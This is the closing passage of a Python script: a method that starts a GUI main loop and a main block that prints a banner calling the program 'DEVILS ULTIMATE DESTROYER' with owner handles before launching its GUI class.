    def run(self):
        self.root.mainloop()

# ═══════════════ MAIN ═══════════════
if __name__ == "__main__":
    print("""
    ╔══════════════════════════════════════════════╗
    ║  💀 DEVILS ULTIMATE DESTROYER 💀           ║
    ║  GUI Mode Starting...                       ║
    ║  Owner: @UnknownGuy9876 | @SGCodexs        ║
    ╚══════════════════════════════════════════════╝
    """)
    
    app = DevilsUltimateGUI()
    app.run()
